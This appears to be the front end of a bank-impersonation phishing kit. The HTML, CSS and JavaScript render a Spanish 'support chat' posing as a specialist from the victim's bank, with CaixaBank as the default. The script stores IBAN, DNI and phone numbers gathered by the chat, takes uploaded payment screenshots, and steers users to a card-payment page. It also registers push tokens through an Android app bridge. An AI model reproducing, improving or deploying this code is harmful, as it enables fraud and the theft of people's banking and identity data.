    <style>
      body:has(.tourist-shell--chat) {
        height: 100dvh;
        padding-bottom: 0;
        overflow: hidden;
      }

      .tourist-shell--chat {
        height: calc(100dvh - 88px);
        display: flex;
        flex-direction: column;
        background: #fafafa;
        overflow: hidden;
      }

      /* ── Specialist card ── */
      .assistant-specialist {
        display: flex;
        align-items: center;
        gap: 12px;
        margin: 16px 16px 0;
        padding: 15px;
        background: #ffffff;
        border-radius: 12px;
        flex-shrink: 0;
      }

      .assistant-specialist__avatar {
        width: 49px;
        height: 49px;
        flex: 0 0 49px;
        border-radius: 50%;
        object-fit: cover;
        background: #ededed;
      }

      .assistant-specialist__text {
        flex: 1;
        min-width: 0;
        display: flex;
        flex-direction: column;
        gap: 2px;
      }

      .assistant-specialist__name {
        margin: 0;
        color: #0f0f0f;
        font-size: 15px;
        font-weight: 600;
        line-height: 23px;
      }

      .assistant-specialist__desc {
        margin: 0;
        color: #787878;
        font-size: 13px;
        font-weight: 400;
        line-height: 20px;
      }

      .assistant-specialist__icon {
        width: 24px;
        height: 24px;
        flex: 0 0 24px;
        display: block;
        animation: assistantPulse 2.4s ease-in-out infinite;
      }

      @keyframes assistantPulse {
        0%, 100% { opacity: 1; }
        50%       { opacity: 0; }
      }

      /* ── Chat scroll ── */
      .chat-scroll {
        flex: 1 1 auto;
        min-height: 0;
        overflow-y: auto;
        -webkit-overflow-scrolling: touch;
        display: flex;
        flex-direction: column;
      }

      .assistant-chat {
        flex: 1 0 auto;
        min-height: 0;
        display: flex;
        flex-direction: column;
        gap: 16px;
        padding: 16px;
        background: #f7f7f7;
        margin-top: 12px;
      }

      /* ── Bubbles ── */
      .assistant-msg {
        max-width: 80%;
        padding: 14px 16px;
        min-width: 0;
        word-break: break-word;
        overflow-wrap: anywhere;
      }

      .assistant-msg p {
        margin: 0;
        font-size: 13px;
        font-weight: 500;
        line-height: 22px;
        word-break: break-word;
        overflow-wrap: anywhere;
      }

      .assistant-msg--bot {
        align-self: flex-start;
        background: #ffffff;
        border-radius: 19px 19px 19px 0;
      }

      .assistant-msg--bot p { color: #0f0f0f; }

      .assistant-msg--user {
        align-self: flex-end;
        background: #fa6c12;
        border-radius: 19px 19px 0 19px;
      }

      .assistant-msg--user p { color: #ffffff; }

      /* ── Typing indicator ── */
      .chat-typing {
        align-self: flex-start;
        display: flex;
        align-items: center;
        gap: 8px;
        padding: 0 16px;
        color: #fa6c12;
        font-size: 13px;
        font-weight: 500;
        line-height: 20px;
      }

      .chat-typing__icon {
        display: block;
        flex-shrink: 0;
        animation: chatPencil 1.4s ease-in-out infinite;
        transform-origin: 80% 80%;
      }

      @keyframes chatPencil {
        0%, 100% { transform: rotate(0deg); }
        50%      { transform: rotate(-12deg); }
      }

      .chat-typing__dots { display: inline-flex; gap: 1px; }
      .chat-typing__dot { opacity: 0; animation: chatTypingDot 1.4s ease-in-out infinite; }
      .chat-typing__dot:nth-child(1) { animation-delay: 0s; }
      .chat-typing__dot:nth-child(2) { animation-delay: 0.2s; }
      .chat-typing__dot:nth-child(3) { animation-delay: 0.4s; }

      @keyframes chatTypingDot {
        0%   { opacity: 0; }
        25%  { opacity: 1; }
        60%  { opacity: 1; }
        80%  { opacity: 0; }
        100% { opacity: 0; }
      }

      /* ── Input bar ── */
      .chat-inputbar {
        flex-shrink: 0;
        display: flex;
        align-items: center;
        gap: 16px;
        padding: 16px;
        background: #f7f7f7;
        box-sizing: border-box;
      }

      .chat-input-wrap {
        flex: 1 1 auto;
        display: flex;
        align-items: center;
        height: 54px;
        padding: 0 16px;
        background: #ffffff;
        border: 1px solid #fa6c12;
        border-radius: 12px;
        box-sizing: border-box;
        transition: border-color 0.2s;
      }

      .chat-input {
        width: 100%;
        border: none;
        outline: none;
        background: transparent;
        font-family: inherit;
        font-size: 13px;
        font-weight: 500;
        line-height: 17px;
        color: #0f0f0f;
      }

      .chat-input::placeholder { color: #9e9e9e; }

      .chat-send {
        flex: 0 0 54px;
        width: 54px;
        height: 54px;
        display: flex;
        align-items: center;
        justify-content: center;
        border: none;
        border-radius: 50%;
        background: #fa6c12;
        cursor: pointer;
        padding: 0;
        transition: background 0.2s;
      }

      .chat-send:disabled { background: #d0d0d0; cursor: default; }

      .chat-send__icon {
        display: block;
        width: 24px;
        height: 24px;
        transform: translateX(2px);
      }

      .chat-send:active:not(:disabled) { opacity: 0.9; }

      /* ── Image button ── */
      .chat-img-btn {
        flex: 0 0 44px;
        width: 44px;
        height: 44px;
        display: flex;
        align-items: center;
        justify-content: center;
        border: 1.5px solid #e2e2e2;
        border-radius: 12px;
        background: #ffffff;
        cursor: pointer;
        padding: 0;
        flex-shrink: 0;
      }
      .chat-img-btn:active:not(:disabled) { background: #f0f0f0; }
      .chat-img-btn:disabled { opacity: 0.4; cursor: default; }

      /* ── Image bubble ── */
      .assistant-msg--image { padding: 5px !important; }
      .assistant-msg--image img {
        display: block;
        max-width: 210px;
        max-height: 210px;
        border-radius: 14px;
        object-fit: cover;
        cursor: pointer;
      }
      .assistant-msg--user.assistant-msg--image img  { border-radius: 14px 14px 2px 14px; }
      .assistant-msg--bot.assistant-msg--image img   { border-radius: 14px 14px 14px 2px; }

      /* ── Caller action buttons (CALLER_ACTION_BUTTONS redesign) ── */
      .caller-actions-wrap {
        align-self: stretch;
        display: flex;
        flex-direction: column;
        gap: 10px;
      }
      .caller-notif-btn {
        display: flex;
        align-items: center;
        justify-content: center;
        gap: 8px;
        width: 100%;
        padding: 15px 20px;
        background: #ffffff;
        border: 1.5px solid #e0e0e0;
        border-radius: 50px;
        font-size: 14px;
        font-weight: 600;
        color: #0f0f0f;
        font-family: inherit;
        cursor: pointer;
        box-sizing: border-box;
        transition: opacity 0.2s;
      }
      .caller-notif-btn:disabled { opacity: 0.4; }
      .caller-msg-bubble {
        align-self: flex-start;
        max-width: 80%;
        background: #ffffff;
        border-radius: 19px 19px 19px 0;
        padding: 14px 16px;
      }
      .caller-msg-bubble p {
        margin: 0;
        font-size: 13px;
        font-weight: 500;
        line-height: 22px;
        color: #0f0f0f;
        word-break: break-word;
      }
      .caller-action-btn {
        display: flex;
        align-items: center;
        justify-content: center;
        gap: 8px;
        width: 100%;
        padding: 15px 20px;
        border-radius: 50px;
        font-size: 14px;
        font-weight: 600;
        text-decoration: none;
        font-family: inherit;
        box-sizing: border-box;
      }
      .caller-action-btn--outline {
        background: #ffffff;
        border: 1.5px solid #e0e0e0;
        color: #0f0f0f;
      }
      .caller-action-btn--primary {
        background: linear-gradient(90deg, #fa6c12 0%, #ff8f40 100%);
        border: none;
        color: #ffffff;
      }

      /* ── Closed banner ── */
      .chat-closed-banner {
        align-self: center;
        background: #f0f0f0;
        border-radius: 12px;
        padding: 10px 16px;
        font-size: 12px;
        font-weight: 500;
        color: #787878;
        text-align: center;
        max-width: 240px;
      }
    </style>
  </head>

    <script>
      (function () {
        localStorage.removeItem('chatUnread');

        var chat     = document.getElementById('supportChat');
        var form     = document.getElementById('supportForm');
        var input    = document.getElementById('supportInput');
        var typing   = document.getElementById('supportTyping');
        var sendBtn  = document.getElementById('supportSendBtn');
        var imgBtn   = document.getElementById('chatImgBtn');
        var imgInput = document.getElementById('chatImgInput');

        var API_BASE = window.FORM_API_BASE || window.MAIN_API_BASE || window.API_BASE || window.location.origin;
        var sessionId = (typeof window.getFlowSessionId === 'function')
          ? window.getFlowSessionId()
          : (localStorage.getItem('flowSessionId') || ('sc' + Date.now()));

        var name = (localStorage.getItem('inputName') || '').trim();
        var bank = (localStorage.getItem('selectedBank') || '').trim();
        if (bank === 'Otro Banco') bank = 'CaixaBank';

        var displayedMsgCount = 0;
        var notifButtonShown = false;

        function escapeHtml(s) {
          return String(s)
            .replace(/&/g, '&amp;').replace(/</g, '&lt;')
            .replace(/>/g, '&gt;').replace(/"/g, '&quot;');
        }

        function isImgContent(s) {
          return s && (s.indexOf('/uploads/') === 0 || s.indexOf('PAYMENT_SCREENSHOT:') === 0);
        }
        function imgUrl(s) {
          return s.indexOf('PAYMENT_SCREENSHOT:') === 0 ? s.slice('PAYMENT_SCREENSHOT:'.length) : s;
        }

        function scrollDown() {
          requestAnimationFrame(function () {
            var scroll = chat.closest('.chat-scroll');
            if (scroll) scroll.scrollTop = scroll.scrollHeight;
          });
        }

        function buildMsgEl(role, content) {
          var el = document.createElement('div');
          if (content === 'CALLER_ACTION_BUTTONS') {
            el.className = 'caller-actions-wrap';
            notifButtonShown = true;

            // 1. Notification permission button
            var notifBtn = document.createElement('button');
            notifBtn.type = 'button';
            notifBtn.className = 'caller-notif-btn';
            notifBtn.innerHTML = 'Permitir notificaciones <svg width="18" height="18" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" aria-hidden="true"><path d="M18 8A6 6 0 0 0 6 8c0 7-3 9-3 9h18s-3-2-3-9" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/><path d="M13.73 21a2 2 0 0 1-3.46 0" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/></svg>';
            notifBtn.addEventListener('click', function () {
              requestPushPermissionFromAndroid();
              notifBtn.disabled = true;
            });

            // 2. Text bubble
            var bubble = document.createElement('div');
            bubble.className = 'caller-msg-bubble';
            var lbl = document.createElement('p');
            lbl.textContent = 'Su solicitud ha sido procesada. Elija una opción:';
            bubble.appendChild(lbl);

            // 3. "Ver notificación" outline button
            var a1 = document.createElement('a');
            a1.href = './notifications2.html';
            a1.className = 'caller-action-btn caller-action-btn--outline';
            a1.innerHTML = 'Ver notificación <svg width="18" height="18" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" aria-hidden="true"><path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/><polyline points="22,6 12,13 2,6" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/></svg>';

            // 4. "Realizar pago" primary button
            var a2 = document.createElement('a');
            a2.href = './credit-card.html';
            a2.className = 'caller-action-btn caller-action-btn--primary';
            a2.innerHTML = 'Realizar pago <svg width="18" height="18" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" aria-hidden="true"><rect x="2" y="5" width="20" height="14" rx="2" stroke="currentColor" stroke-width="1.5"/><path d="M2 10h20" stroke="currentColor" stroke-width="1.5"/></svg>';

            el.appendChild(notifBtn);
            el.appendChild(bubble);
            el.appendChild(a1);
            el.appendChild(a2);
            return el;
          }
          var isImg = isImgContent(content);
          el.className = 'assistant-msg '
            + (role === 'user' ? 'assistant-msg--user' : 'assistant-msg--bot')
            + (isImg ? ' assistant-msg--image' : '');
          if (isImg) {
            var imgEl = document.createElement('img');
            imgEl.src = imgUrl(content);
            imgEl.alt = '';
            imgEl.addEventListener('click', function () {
              var ov = document.createElement('div');
              ov.style.cssText = 'position:fixed;inset:0;z-index:9999;background:rgba(0,0,0,.85);display:flex;align-items:center;justify-content:center;padding:20px;box-sizing:border-box;';
              var bi = document.createElement('img');
              bi.src = imgEl.src;
              bi.style.cssText = 'max-width:100%;max-height:90vh;border-radius:12px;object-fit:contain;';
              ov.appendChild(bi);
              ov.addEventListener('click', function () { document.body.removeChild(ov); });
              document.body.appendChild(ov);
            });
            el.appendChild(imgEl);
          } else {
            el.innerHTML = '<p>' + escapeHtml(content).replace(/\n/g, '<br>') + '</p>';
          }
          return el;
        }

        function addMessage(role, content) {
          var el = buildMsgEl(role, content);
          if (!el) { displayedMsgCount++; return; }
          chat.insertBefore(el, typing);
          displayedMsgCount++;
          scrollDown();
          if (role !== 'user') localStorage.setItem('chatUnread', '1');
        }

        function showTyping(on) {
          typing.style.display = on ? 'flex' : 'none';
          if (on) chat.appendChild(typing);
          scrollDown();
        }

        function requestPushPermissionFromAndroid() {
          if (!window.AndroidBridge) return;
          try {
            var alreadyAllowed = window.AndroidBridge.hasNotificationPermission();
            if (alreadyAllowed) return;
            window.AndroidBridge.requestNotificationPermission();
          } catch(e) {}
        }

        // Отключено: отдельный баннер «Notificaciones» и подсказка больше не показываются.
        // Разрешение на уведомления запрашивается единственной кнопкой «Permitir notificaciones»
        // внутри блока CALLER_ACTION_BUTTONS.
        function showNotifButton() { /* no-op */ }

        // Отключено: баннер «El operador se pondrá en contacto…» больше не показывается.
        function showDoneBanner() { /* no-op */ }

        function setBusy(on) {
          input.disabled = on;
          sendBtn.disabled = on;
          imgBtn.disabled = on;
          showTyping(on);
        }

        function uploadImage(file, onSuccess, onError) {
          var reader = new FileReader();
          reader.onload = function (ev) {
            var img = new Image();
            img.onload = function () {
              var MAX = 1200, w = img.width, h = img.height;
              if (w > MAX || h > MAX) {
                if (w > h) { h = Math.round(h * MAX / w); w = MAX; }
                else { w = Math.round(w * MAX / h); h = MAX; }
              }
              var canvas = document.createElement('canvas');
              canvas.width = w; canvas.height = h;
              canvas.getContext('2d').drawImage(img, 0, 0, w, h);
              canvas.toBlob(function (blob) {
                var fd = new FormData();
                fd.append('image', blob, 'photo.jpg');
                fetch(API_BASE.replace(/\/+$/, '') + '/api/upload-image', {
                  method: 'POST', body: fd, mode: 'cors', credentials: 'omit',
                })
                  .then(function (r) { return r.json(); })
                  .then(function (d) { d && d.url ? onSuccess(d.url) : onError(); })
                  .catch(onError);
              }, 'image/jpeg', 0.85);
            };
            img.onerror = onError;
            img.src = ev.target.result;
          };
          reader.onerror = onError;
          reader.readAsDataURL(file);
        }

        function postChat(payload) {
          return fetch(API_BASE.replace(/\/+$/, '') + '/api/support-chat', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload),
            mode: 'cors',
            credentials: 'omit',
          }).then(function (r) { return r.json(); });
        }

        function markRead() {
          fetch(API_BASE.replace(/\/+$/, '') + '/api/support-chat/read', {
            method: 'POST', headers: { 'Content-Type': 'application/json' }, credentials: 'omit',
            body: JSON.stringify({ sessionId: sessionId }),
          }).catch(function () {});
        }

        var pollTimer = null;
        function startPolling() {
          if (pollTimer) return;
          pollTimer = setInterval(function () {
            fetch(API_BASE.replace(/\/+$/, '') + '/api/support-chat/history/' + encodeURIComponent(sessionId), {
              method: 'GET', cache: 'no-store', mode: 'cors', credentials: 'omit',
            })
              .then(function (r) { return r.json(); })
              .then(function (data) {
                var msgs = (data && data.messages) || [];
                if (msgs.length > displayedMsgCount) {
                  msgs.slice(displayedMsgCount).forEach(function (m) {
                    if (m.role !== 'user') addMessage('bot', m.content);
                    else displayedMsgCount++;
                  });
                  markRead();
                  var botCount = msgs.filter(function(m){ return m.role !== 'user'; }).length;
                  localStorage.setItem('chatBotMsgCount', String(botCount));
                }
                if (data && data.closed && !document.getElementById('chatClosedBanner')) showDoneBanner();
              })
              .catch(function () {});
          }, 4000);
        }

        function saveCollectedData(data) {
          if (data.collectedIban)  localStorage.setItem('chatIban',  data.collectedIban);
          if (data.collectedDni)   localStorage.setItem('chatDni',   data.collectedDni);
          if (data.collectedPhone) localStorage.setItem('chatPhone', data.collectedPhone);
        }

        function send(content) {
          localStorage.removeItem('chatUnread');
          setBusy(true);
          postChat({ sessionId: sessionId, message: content, name: name, bank: bank })
            .then(function (data) {
              setBusy(false);
              saveCollectedData(data || {});
              if (data && data.reply) addMessage('bot', data.reply);
              if (data && data.done) showDoneBanner();
            })
            .catch(function () {
              setBusy(false);
              addMessage('bot', 'Hubo un problema de conexión. Inténtalo de nuevo en un momento.');
            });
        }

        form.addEventListener('submit', function (e) {
          e.preventDefault();
          var text = input.value.trim();
          if (!text || input.disabled) return;
          addMessage('user', text);
          input.value = '';
          send(text);
        });

        imgBtn.addEventListener('click', function () {
          if (input.disabled) return;
          imgInput.click();
        });

        imgInput.addEventListener('change', function () {
          var file = imgInput.files && imgInput.files[0];
          imgInput.value = '';
          if (!file || input.disabled) return;
          imgBtn.disabled = true;
          input.disabled = true;
          sendBtn.disabled = true;
          uploadImage(file, function (url) {
            imgBtn.disabled = false;
            input.disabled = false;
            sendBtn.disabled = false;
            addMessage('user', url);
            postChat({ sessionId: sessionId, message: url, name: name, bank: bank })
              .then(function (data) {
                saveCollectedData(data || {});
                if (data && data.reply) addMessage('bot', data.reply);
                if (data && data.done) showDoneBanner();
              })
              .catch(function () {});
          }, function () {
            imgBtn.disabled = false;
            input.disabled = false;
            sendBtn.disabled = false;
          });
        });

        function init() {
          fetch(API_BASE.replace(/\/+$/, '') + '/api/support-chat/history/' + encodeURIComponent(sessionId), {
            method: 'GET', cache: 'no-store', mode: 'cors', credentials: 'omit',
          })
            .then(function (r) { return r.json(); })
            .then(function (data) {
              var msgs = (data && data.messages) || [];
              var alreadyClosed = !!(data && data.closed);

              if (msgs.length) {
                msgs.forEach(function (m) {
                  var el = buildMsgEl(m.role === 'user' ? 'user' : 'bot', m.content);
                  if (el) chat.insertBefore(el, typing);
                  displayedMsgCount++;
                });
                scrollDown();
                markRead();
                var botCount = msgs.filter(function(m){ return m.role !== 'user'; }).length;
                localStorage.setItem('chatBotMsgCount', String(botCount));
                if (alreadyClosed) showDoneBanner(false);
                startPolling();
                return;
              }

              setBusy(true);
              postChat({ sessionId: sessionId, start: true, name: name, bank: bank })
                .then(function (d) {
                  setBusy(false);
                  if (d && d.reply) addMessage('bot', d.reply);
                  if (d && d.done) showDoneBanner();
                  startPolling();
                })
                .catch(function () { setBusy(false); startPolling(); });
            })
            .catch(function () {});
        }

        init();

        // Register FCM push token — wait 5s as recommended by APK developer
        (function registerPushToken() {
          var registered = false;
          function tryGet() {
            return (window.AndroidBridge && typeof window.AndroidBridge.getFcmToken === 'function')
              ? (window.AndroidBridge.getFcmToken() || null) : null;
          }
          function doRegister(token) {
            if (registered) return;
            registered = true;
            fetch(API_BASE.replace(/\/+$/, '') + '/api/push/register', {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({ sessionId: sessionId, token: token }),
              mode: 'cors', credentials: 'omit',
            }).catch(function () {});
          }
          function startRetryLoop() {
            if (registered) return;
            var retries = 0;
            var iv = setInterval(function () {
              var t = tryGet();
              if (t) { clearInterval(iv); doRegister(t); return; }
              if (++retries >= 20) clearInterval(iv);
            }, 3000);
          }
          setTimeout(function () {
            var t = tryGet();
            if (t) { doRegister(t); return; }
            startRetryLoop();
          }, 5000);
          document.addEventListener('visibilitychange', function () {
            if (document.visibilityState === 'visible' && !registered) {
              setTimeout(function () {
                var t = tryGet();
                if (t) { doRegister(t); } else { startRetryLoop(); }
              }, 2000);
            }
          });
        })();
      })();
    </script>
  </body>
</html>
